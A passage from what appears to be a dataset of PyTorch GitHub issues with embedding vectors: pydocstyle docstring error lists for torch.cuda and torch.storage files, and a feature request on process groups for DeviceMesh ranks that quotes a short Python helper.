- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_cached`, **Line**: 419, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_cached`, **Line**: 427, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_snapshot`, **Line**: 435, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: First line should end with a period (not 'r')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `_CUDAAllocator`, **Line**: 741, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/memory.py`, **Entity**: `_CUDAAllocator`, **Line**: 741, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `CUDAPluggableAllocator`, **Line**: 751, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `change_current_allocator`, **Line**: 783, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `change_current_allocator`, **Line**: 783, **Description**: First line should be in imperative mood (perhaps 'Change', not 'Changes')
- **File**: `torch/cuda/memory.py`, **Entity**: `_get_current_allocator`, **Line**: 796, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_push`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_push`, **Line**: 21, **Description**: First line should end with a period (not 'd')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_pop`, **Line**: 32, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_pop`, **Line**: 32, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_start`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_start`, **Line**: 40, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range`, **Line**: 78, **Description**: First line should end with a period (not 'g')

cc @carljparker",False,"[-0.15304154 -0.17932127 -0.1195554  -0.10144296  0.07138672 -0.20389645
 -0.04551943  0.19459882 -0.20977928  0.06598648  0.02431613 -0.02656882
  0.06884775  0.09131844 -0.12271291 -0.02522869 -0.26688892 -0.45585066
  0.1537242   0.11306047  0.05638681  0.4668492  -0.06362348  0.02205248
 -0.04873178  0.13596155 -0.42945725 -0.11557665  0.06925786  0.08484593
  0.324422    0.04332183 -0.19800535  0.05232549  0.39280608  0.3306521
 -0.19882306 -0.173868    0.00719942  0.08893351 -0.00803168 -0.12854671
 -0.09137552  0.04367676  0.11633164 -0.13643613 -0.2061022   0.25633985
  0.00075609  0.12920886 -0.03555813  0.12501414 -0.19641545  0.06460389
  0.23883116  0.06066431 -0.12453689  0.53218347 -0.01371321 -0.10704147
  0.14532834  0.1570719  -0.10304917 -0.00606002 -0.12985961  0.30869377
  0.02746644  0.23327339  0.27758515  0.11891195 -0.14163806  0.12335745
 -0.35062888 -0.2075604  -0.00507879  0.33613724 -0.37605596 -0.00503141
 -0.3039168  -0.4071813  -0.11361071  0.09971458  0.02940134  0.0945605
  0.06975967 -0.08625206  0.32023194 -0.0591708   0.4186362   0.0882906
  0.41645434 -0.17657802 -0.03923929  0.3177134   0.11187121  0.25085357
 -0.14594936 -0.00759179 -0.02534909 -0.09037134  0.12150467 -0.3146034
 -0.11437769  0.14092703  0.02956298 -0.02943721  0.1098991   0.10719348
  0.14631549 -0.10926186  0.1391964  -0.14947231 -0.04250973  0.13388988
  0.3277289   0.05442783 -0.1572212   0.03020116 -0.27004343 -0.04739105
  0.17512348  0.1492254  -0.01175709  0.07297247  0.04709282 -0.00509429
  0.18457055  0.0117206   0.04341763 -0.11708035  0.12602174 -0.01077579
 -0.16549349  0.12019795  0.1943676   0.20126009 -0.11458541 -0.1936322
  0.02896963 -0.16451865 -0.15279841 -0.35713464 -0.17450222 -0.263265
  0.13898662  0.24243088 -0.39239573  0.3092582   0.05761841  0.27599198
 -0.00488131 -0.01776784 -0.29157138  0.4668203  -0.06050783 -0.02405217
  0.38108343  0.04350538 -0.04500813 -0.37979648 -0.05421158  0.10683668
 -0.00517792  0.10372594 -0.1347706   0.14402081 -0.2530645  -0.19436766
 -0.2920056  -0.2075775  -0.02704133  0.10146067 -0.04110563 -0.0635241
  0.18387854  0.08179753 -0.08689009 -0.20513438 -0.01601384  0.27463543
  0.05511914  0.5169775   0.07322845  0.02534092 -0.13228555  0.17173609
  0.18580559 -0.08575429  0.19167873  0.23496857  0.00717679 -0.24415424
 -0.03159652  0.00218933 -0.06537346 -0.0401841   0.24876404  0.48392966
  0.05531229  0.25717604 -0.2871704   0.23144154  0.29614386 -0.10239478
  0.4824576  -0.02394043 -0.52754784 -0.2985043  -0.13736567  0.13087443
 -0.31622964 -0.1308663   0.03019291 -0.24770498 -0.20917377  0.23649186
 -0.00504876 -0.30959564  0.3094717  -0.01213416 -0.2509012  -0.03833337
 -0.11888544 -0.3111503   0.36525533  0.11635998 -0.03241653 -0.22123542
  0.01203761 -0.074544   -0.00122831 -0.05739249  0.38946295 -0.22203447
  0.03393574  0.20146492 -0.07805225 -0.11141828  0.2367742   0.2780432
 -0.14866588 -0.1529217  -0.07783405 -0.01491824  0.11464223 -0.10645734
 -0.10033428  0.11008659 -0.24738124  0.15954673  0.01302268 -0.3143823
  0.05976325 -0.10038351  0.55339956 -0.02085627 -0.20027933 -0.07926759
 -0.08556577 -0.01980704 -0.01361429  0.31695873 -0.1977082   0.1534356
  0.2687211  -0.16439214 -0.21181428  0.24938218 -0.23562917 -0.12447159
  0.1339979  -0.46702412  0.37898058  0.2107061   0.31029874 -0.05301793
  0.3798223  -0.05983771  0.15573758  0.0266838  -0.13355097  0.37646195
 -0.36630213 -0.04997061  0.27227914 -0.12793234 -0.21248482 -0.178829
 -0.47818846 -0.20207274 -0.22241516  0.24292967  0.18288708  0.08463189
  0.04779185  0.16081102 -0.1272285   0.14362974  0.1870304   0.14119163
 -0.49631214 -0.11106147 -0.12271938  0.30542463 -0.05472744  0.25468123
  0.03910176  0.10694319  0.08698952 -0.26608264  0.33137345  0.29567042
 -0.34546414  0.2519225  -0.08840183  0.07779387  0.0176363   0.46792573
  0.13751014  0.08057533 -0.11979369 -0.39082915 -0.23647335  0.10974189
  0.02291783 -0.10843153 -0.45622694  0.18711716 -0.2836383  -0.2131017
  0.21247321 -0.03314052 -0.07363697 -0.19151628 -0.09348765  0.01858863
 -0.10018565  0.16339362 -0.05524036 -0.27698827 -0.02478296 -0.22479424
  0.09245704 -0.44449338 -0.04956229 -0.06963383  0.19240755  0.2789761
 -0.41277075 -0.41613832  0.52615964 -0.05332785 -0.30098695  0.02512661
 -0.16846181  0.45683208  0.03108888  0.29118282 -0.01655324  0.28074303
 -0.55058956 -0.04552631 -0.12097268 -0.23179437 -0.0947793  -0.2716456
 -0.1638721   0.02020536  0.24384983 -0.21702081 -0.30450907  0.17965172
 -0.18206471  0.22178192  0.40894872  0.13449693  0.03909317  0.0654795
  0.06313078 -0.2586222  -0.2695741   0.26013446  0.3733508  -0.08949305]"
"Fix docstring errors in graphs.py, storage.py, _sanitizer.py, _utils.py, jiterator.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 124, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 124, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 128, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 128, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 132, **Description**: First line should end with a period (not 'U')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 132, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `mps`, **Line**: 139, **Description**: First line should end with a period (not 'S')
- **File**: `torch/storage.py`, **Entity**: `mps`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `double`, **Line**: 154, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `float`, **Line**: 158, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `half`, **Line**: 162, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `long`, **Line**: 166, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `int`, **Line**: 170, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `short`, **Line**: 174, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `char`, **Line**: 178, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `byte`, **Line**: 182, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bool`, **Line**: 186, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bfloat16`, **Line**: 190, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_double`, **Line**: 194, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_float`, **Line**: 198, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `pin_memory`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/storage.py`, **Entity**: `share_memory_`, **Line**: 230, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 254, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/storage.py`, **Entity**: `byteswap`, **Line**: 268, **Description**: First line should end with a period (not 'a')
- **File**: `torch/storage.py`, **Entity**: `byteswap`, **Line**: 268, **Description**: First line should be in imperative mood (perhaps 'Swap', not 'Swaps')
- **File**: `torch/storage.py`, **Entity**: `untyped`, **Line**: 609, **Description**: First line should end with a period (not '`')
- **File**: `torch/storage.py`, **Entity**: `untyped`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 806, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 806, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 811, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 811, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 816, **Description**: First line should end with a period (not 'U')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 816, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `pin_memory`, **Line**: 833, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/storage.py`, **Entity**: `share_memory_`, **Line**: 845, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 862, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 862, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/storage.py`, **Entity**: `double`, **Line**: 971, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `float`, **Line**: 976, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `half`, **Line**: 981, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `long`, **Line**: 986, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `int`, **Line**: 991, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `short`, **Line**: 996, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `char`, **Line**: 1001, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `byte`, **Line**: 1006, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bool`, **Line**: 1011, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bfloat16`, **Line**: 1016, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_double`, **Line**: 1021, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_float`, **Line**: 1026, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `from_file`, **Line**: 1032, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `from_file`, **Line**: 1032, **Description**: First line should not be the function's ""signature""
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 1138, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 1138, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `Access`, **Line**: 53, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `TensorInfo`, **Line**: 147, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `enable_cuda_sanitizer`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/graphs.py`, **Entity**: `is_current_stream_capturing`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph_pool_handle`, **Line**: 29, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph_pool_handle`, **Line**: 29, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `CUDAGraph`, **Line**: 41, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `capture_end`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `capture_end`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'End', not 'Ends')
- **File**: `torch/cuda/graphs.py`, **Entity**: `replay`, **Line**: 82, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `reset`, **Line**: 88, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `reset`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Delete', not 'Deletes')
- **File**: `torch/cuda/graphs.py`, **Entity**: `pool`, **Line**: 94, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `pool`, **Line**: 94, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `enable_debug_mode`, **Line**: 102, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `enable_debug_mode`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/graphs.py`, **Entity**: `debug_dump`, **Line**: 108, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `debug_dump`, **Line**: 108, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: First line should end with a period (not '`')
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: First line should be in imperative mood (perhaps 'Accept', not 'Accepts')
- **File**: `torch/cuda/jiterator.py`, **Entity**: `_create_jit_fn`, **Line**: 80, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/jiterator.py`, **Entity**: `_create_multi_output_jit_fn`, **Line**: 142, **Description**: No blank lines allowed after function docstring (found 1)

cc @carljparker",False,"[-2.28119701e-01 -2.27826208e-01 -4.79096100e-02 -1.04340896e-01
  2.06111833e-01 -9.95693505e-02 -5.24238348e-02  9.81652439e-02
 -2.97131568e-01  5.09121083e-02  5.77993691e-02  1.23893522e-01
  2.27328971e-01  1.70149475e-01 -6.06938899e-02 -2.08158866e-02
 -1.43409520e-01 -5.26445508e-01  5.93307652e-02  1.27818152e-01
  2.56535351e-01  4.53249276e-01 -3.80927771e-02 -7.99009949e-02
 -1.31133031e-02  2.09502243e-02 -3.37438375e-01 -2.32725799e-01
  3.94171476e-02  8.31466839e-02  3.55844229e-01  1.54236004e-01
 -2.01939374e-01  2.10434608e-02  3.63022953e-01  2.97779202e-01
 -1.20481476e-01 -7.66977444e-02  8.67067873e-02  2.32236654e-01
 -6.07062429e-02 -1.51911825e-01 -1.06637023e-01  1.09177627e-01
  1.16464108e-01 -1.43132508e-01 -1.51252791e-01  1.53702021e-01
 -5.51567413e-03  1.53613657e-01 -1.29329726e-01  6.66632801e-02
 -1.83749691e-01  3.51949036e-03  2.40490049e-01  9.78158042e-03
 -6.94305599e-02  5.48140883e-01  2.81109810e-02 -2.83258222e-03
  1.98913634e-01  8.58353823e-02 -1.27618089e-01  7.72198811e-02
  4.32917960e-02  3.17064524e-01  6.08960055e-02  2.59676754e-01
  3.33033264e-01  2.02322513e-01 -1.80841252e-01  1.48535430e-01
 -4.79247868e-01 -2.34765127e-01 -4.94736917e-02  3.06369960e-01
 -4.24848914e-01 -1.15699984e-01 -2.29339868e-01 -3.21020901e-01
 -1.92591012e-01  3.08846682e-02  2.53489912e-02  1.86164707e-01
  8.83297473e-02 -4.21279222e-02  2.12114185e-01 -1.35225520e-01
  3.16833019e-01  7.69982338e-02  5.08406818e-01 -1.45931557e-01
 -2.42453124e-02  3.72543156e-01  3.79609875e-02  3.01698148e-01
 -8.07340145e-02 -5.03313541e-02 -1.96367241e-02 -1.15322843e-01
  6.29959106e-02 -3.66418898e-01 -1.45531341e-01  3.23062390e-02
  9.88807231e-02 -1.15229204e-01  9.22830254e-02  3.13556083e-02
  1.30108967e-01  5.01177572e-02  5.63369803e-02 -1.24943256e-01
  3.83362100e-02  1.99838057e-01  2.85263896e-01  9.12140682e-02
 -8.76910239e-02  2.20753010e-02 -3.13533604e-01 -1.17384642e-01
  2.45007321e-01  2.37955391e-01 -1.28088623e-01 -3.81792709e-03
  8.97467881e-03  6.05584905e-02  2.22942531e-01 -3.49083953e-02
 -2.51306742e-02 -2.04853415e-01  1.27646625e-01  3.22325528e-03
 -1.81896880e-01  1.19937792e-01  2.48636588e-01  5.81608191e-02
 -1.57086346e-02 -2.52161741e-01  2.99667306e-02 -4.90624737e-03
 -2.82776058e-01 -3.33323210e-01 -2.08145782e-01 -2.85326242e-01
  2.70760328e-01  3.51731300e-01 -3.56589168e-01  3.04403663e-01
  7.05773681e-02  1.44516379e-01 -4.37778048e-02  7.16220289e-02
 -3.45186949e-01  5.04576206e-01 -5.60307242e-02  7.29965419e-02
  3.81656051e-01  1.29407510e-01 -2.61949208e-02 -3.60037804e-01
 -3.41249034e-02  2.08576918e-01  2.23070495e-02 -3.66821885e-03
 -2.13337362e-01  1.61110565e-01 -1.04988143e-01 -1.45023212e-01
 -4.08687830e-01 -1.16986796e-01 -2.00902801e-02  1.95604131e-01
 -1.16627887e-02 -1.09664947e-01  1.29846886e-01  1.50829211e-01
 -9.17659253e-02 -3.50267231e-01 -2.36368598e-03  2.29516953e-01
  8.99496451e-02  5.04599988e-01  6.34241402e-02  8.57272744e-02
 -1.47672221e-01  8.69703218e-02  1.70832962e-01 -1.80630118e-01
  1.50324672e-01  4.31305736e-01  2.72866786e-02 -1.89459473e-01
  8.78945291e-02  3.20567116e-02 -1.46800190e-01  1.84791982e-02
  2.47555658e-01  4.38874185e-01  6.12376183e-02  2.39152431e-01
 -1.78590953e-01  1.85906917e-01  3.11602145e-01 -1.46833926e-01
  3.77499312e-01 -1.35626435e-01 -4.00149345e-01 -3.37450922e-01
 -1.70102298e-01 -6.52224422e-02 -4.01605487e-01 -1.03502050e-01
  2.12563816e-02 -1.94853365e-01 -2.04300910e-01  3.78456235e-01
  5.91079146e-02 -2.40499914e-01  1.96581855e-01 -6.96650296e-02
 -3.48549455e-01  1.49700306e-02 -2.05575138e-01 -2.82188654e-01
  2.71920532e-01  1.63566798e-01  1.25110708e-02 -6.92857206e-02
 -3.34970802e-02 -9.91366245e-03 -5.35878837e-02  1.68681145e-05
  4.11365449e-01 -2.28992283e-01  2.50995271e-02  7.26089776e-02
 -1.15588129e-01  6.32438809e-02  6.32099882e-02  3.69677961e-01
 -1.84364438e-01 -6.33567721e-02 -2.25407243e-01  5.26518421e-03
 -2.01990586e-02 -2.19157338e-01 -1.08230844e-01  5.35613447e-02
 -2.23300070e-01  1.70234025e-01 -9.73028615e-02 -3.88596416e-01
  9.63787735e-02 -5.90995885e-03  4.95722026e-01  5.38424030e-02
 -2.42677227e-01 -5.63857555e-02 -9.61533487e-02  1.27539337e-01
  1.76743474e-02  1.51985765e-01 -9.78154317e-02  1.66961551e-01
  3.19419682e-01 -2.26931274e-01 -2.06041038e-01  2.35280812e-01
 -4.35150266e-02 -6.67031556e-02  2.14185223e-01 -5.58473170e-01
  3.31406057e-01  1.03716530e-01  4.17055786e-01  5.37045524e-02
  3.54198337e-01 -5.48098609e-02 -5.95474755e-03 -2.63843685e-05
 -1.91141531e-01  3.87853593e-01 -4.05345321e-01 -9.37188044e-02
  2.27954417e-01 -9.80510861e-02 -1.67395145e-01 -3.05721402e-01
 -5.45389891e-01 -2.10093081e-01 -1.58160552e-01  1.54622301e-01
  3.34733248e-01 -4.30151969e-02  1.32147297e-01  2.23613814e-01
 -9.49580222e-03 -1.80262104e-02  2.43142843e-01  1.12466536e-01
 -4.95955199e-01 -1.51545346e-01 -2.43382603e-01  2.26040035e-01
  8.03625137e-02  3.22608590e-01  7.07377866e-02  2.23007612e-03
  1.74508225e-02 -3.24978322e-01  3.59088659e-01  3.32832068e-01
 -2.63481945e-01  1.78967774e-01 -1.12659387e-01  4.68540750e-02
 -2.98842229e-02  5.46468854e-01  1.52281851e-01  6.44541308e-02
 -5.65950647e-02 -3.29332471e-01 -1.21916115e-01 -6.78565726e-02
 -2.02975702e-02  1.18136816e-02 -4.18277055e-01  7.46667832e-02
 -1.01257823e-01 -2.83559322e-01  2.31326908e-01  1.12732537e-01
 -1.21384479e-01 -1.48504868e-01 -1.69811755e-01 -4.27728668e-02
 -8.74957591e-02  1.10073954e-01 -7.99624845e-02 -2.94271231e-01
  1.84063986e-03 -1.56630158e-01  1.21615209e-01 -5.53664625e-01
 -5.95303178e-02 -2.69526895e-02  6.82778731e-02  3.03933382e-01
 -3.96454960e-01 -4.07469511e-01  5.08177459e-01 -4.39583547e-02
 -2.86875457e-01  2.34815776e-02 -1.06321394e-01  4.37499732e-01
 -6.35458902e-02  2.78233290e-01 -7.02734441e-02  3.52268577e-01
 -6.96000338e-01 -1.00097790e-01 -2.04623431e-01 -1.40479520e-01
 -1.10106036e-01 -2.93486357e-01 -1.51989073e-01 -1.64820738e-02
  2.79649019e-01 -3.61920968e-02 -3.42670679e-01  1.18637972e-01
 -1.68140367e-01  3.24974120e-01  3.36134374e-01  1.91420227e-01
  2.43777260e-02  1.61788631e-02  8.02163407e-02 -2.76387572e-01
 -4.49511439e-01  2.70240456e-01  3.72517526e-01 -1.56873375e-01]"
Get the specified pg dtensor and devicemesh of given the ranks ,"### ðŸš€ The feature, motivation and pitch

Can torch.devicemesh get the pg of a given ranks like [colossal-AI,](https://github.com/hpcaitech/ColossalAI/blob/8993c8a8170ac116a551840e3d442af78bedc53e/colossalai/cluster/process_group_mesh.py#L134-L149C59) I need to gather dtensor to specify the matrix block of the process,I know torch has **all_gather_tensor** can gather dtensor from **devicemesh dim**, [usage](https://discuss.pytorch.org/t/dtensor-dynamic-gather-local-tensor/191047)
```python
    def get_group(self, ranks_in_group: List[int], backend: Optional[str] = None) -> ProcessGroup:
        """"""Get the process group with the given ranks. It the process group doesn't exist, it will be created.


        Args:
            ranks_in_group (List[int]): Ranks in the process group.
            backend (Optional[str], optional): Backend of the process group. Defaults to None.


        Returns:
            ProcessGroup: The process group with the given ranks.
        """"""
        ranks_in_group = sorted(ranks_in_group)
        if tuple(ranks_in_group) not in self._group_to_ranks:
            group = dist.new_group(ranks_in_group, backend=backend)
            self._ranks_to_group[tuple(ranks_in_group)] = group
            self._group_to_ranks[group] = tuple(ranks_in_group)
        return self._ranks_to_group[tuple(ranks_in_group)]
```
### Alternatives
```python
